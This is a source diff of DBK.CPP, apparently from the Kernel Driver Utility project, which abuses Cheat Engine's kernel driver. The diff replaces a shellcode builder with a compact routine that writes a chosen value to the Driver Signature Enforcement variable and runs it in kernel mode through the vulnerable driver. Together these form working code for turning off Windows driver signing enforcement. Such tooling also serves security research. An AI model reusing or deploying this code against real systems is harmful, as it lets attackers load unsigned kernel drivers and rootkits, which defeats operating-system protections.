@@ -4,9 +4,9 @@
 *
 *  TITLE:       DBK.CPP
 *
-*  VERSION:     1.27
+*  VERSION:     1.28
 *
-*  DATE:        10 Nov 2022
+*  DATE:        01 Dec 2022
 *
 *  Cheat Engine's DBK driver routines.
 *
@@ -31,90 +31,6 @@
 #define DBK_DEVICE_LINK L"\\DosDevices\\CEDRIVER73"
 #define DBK_PROCESS_LIST L"\\BaseNamedObjects\\DBKProcList60"
 #define DBK_THREAD_LIST L"\\BaseNamedObjects\\DBKThreadList60"
-
-#define DBK_INIT_CODE_SIZE 16
-#define DBK_SC_MAX_SIZE PAGE_SIZE
-#define DBK_SHELLCODE_CI_PAYLOAD_SIZE DBK_SC_MAX_SIZE -\
-    DBK_INIT_CODE_SIZE - \
-    sizeof(PULONG_PTR) - \
-    sizeof(ULONG_PTR)
-
-typedef struct _DBK_SHELLCODE_CI {
-    BYTE InitCode[DBK_INIT_CODE_SIZE];
-    BYTE Payload[DBK_SHELLCODE_CI_PAYLOAD_SIZE];
-    PULONG_PTR AddressOfVariable;
-    ULONG_PTR ValueToWrite;
-} DBK_SHELLCODE_CI, * PDBK_SHELLCODE_CI;
-
-/*
-* DbkDsePatchRoutine
-*
-* Purpose:
-*
-* DSE patch to be executed in kernel mode.
-*
-*/
-VOID WINAPI DbkDsePatchRoutine(
-    _In_ PDBK_SHELLCODE_CI ShellCode
-)
-{
-    *ShellCode->AddressOfVariable = ShellCode->ValueToWrite;
-}
-
-/*
-* DbkpBuildShellCodeDsePatch
-*
-* Purpose:
-*
-* DSE patch code construction.
-*
-*/
-BOOL DbkpBuildShellCodeDsePatch(
-    _In_ PDBK_SHELLCODE_CI ShellCode,
-    _In_ ULONG_PTR Address,
-    _In_ ULONG_PTR Value
-)
-{
-    ULONG procSize, maxSize;
-    PVOID pvInitCode;
-    ULONG initSize = 0;
-
-    procSize = ScSizeOfProc((BYTE*)DbkDsePatchRoutine);
-    maxSize = DBK_SHELLCODE_CI_PAYLOAD_SIZE;
-
-    if (procSize > maxSize) {
-        supPrintfEvent(kduEventError,
-            "[!] Bootstrap code size 0x%lX exceeds limit 0x%lX, abort\r\n",
-            procSize,
-            maxSize);
-
-#ifndef _DEBUG
-        return FALSE;
-#endif
-    }
-
-    RtlCopyMemory(ShellCode->Payload, DbkDsePatchRoutine, procSize);
-    RtlFillMemory(ShellCode->InitCode, sizeof(ShellCode->InitCode), 0xCC);
-
-    pvInitCode = ScGetBootstrapLdr(KDU_SHELLCODE_V4, &initSize);
-
-    if (initSize > DBK_INIT_CODE_SIZE) {
-
-        supPrintfEvent(kduEventError,
-            "[!] Loader code size 0x%lX exceeds limit 0x%lX, abort\r\n",
-            initSize,
-            DBK_INIT_CODE_SIZE);
-
-        return FALSE;
-    }
-
-    RtlCopyMemory(ShellCode->InitCode, pvInitCode, initSize);
-
-    ShellCode->AddressOfVariable = (PULONG_PTR)Address;
-    ShellCode->ValueToWrite = Value;
-
-    return TRUE;
-}
 
 /*
 * DbkSetupCheatEngineObjectNames
@@ -757,6 +673,13 @@ BOOL DbkMapDriver(
     return bSuccess;
 }
 
+#ifdef __cplusplus
+extern "C" {
+    void BaseShellDSEFix();
+    void BaseShellDSEFixEnd();
+}
+#endif
+
 /*
 * DbkControlDSE
 *
@@ -772,42 +695,38 @@ BOOL DbkControlDSE(
 )
 {
     BOOL bResult = FALSE;
-    DBK_SHELLCODE_CI* pvShellCode;
+
+    BYTE shellBuffer[SHELLCODE_SMALL];
+    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
-    pvShellCode = (DBK_SHELLCODE_CI*)VirtualAlloc(NULL, sizeof(DBK_SHELLCODE_CI),
-        MEM_RESERVE | MEM_COMMIT,
-        PAGE_EXECUTE_READWRITE);
+    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
+    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);
 
-    if (pvShellCode) {
+    *(PULONG_PTR)&shellBuffer[0x2] = Address;
+    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;
 
-        if (DbkpBuildShellCodeDsePatch(pvShellCode, Address, DSEValue)) {
+    if (shellSize > SHELLCODE_SMALL) {
+        supPrintfEvent(kduEventError,
+            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);
 
-            printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
-                (PVOID)Address,
-                DSEValue);
+        return FALSE;
+    }
 
-            if (DbkpMapAndExecuteCode(Context,
-                pvShellCode,
-                sizeof(DBK_SHELLCODE_CI),
-                FALSE,
-                NULL,
-                NULL))
-            {
-                supPrintfEvent(kduEventInformation,
-                    "[+] DSE patch executed successfully\r\n");
-            }
+    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
+        (PVOID)Address,
+        DSEValue);
 
-        }
-        else {
-
-            supPrintfEvent(kduEventError,
-                "[!] Error while building shellcode, abort\r\n");
-
-        }
-
-        VirtualFree(pvShellCode, 0, MEM_RELEASE);
+    if (DbkpMapAndExecuteCode(Context,
+        shellBuffer,
+        (ULONG)shellSize,
+        FALSE,
+        NULL,
+        NULL))
+    {
+        supPrintfEvent(kduEventInformation,
+            "[+] DSE patch executed successfully\r\n");
     }
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
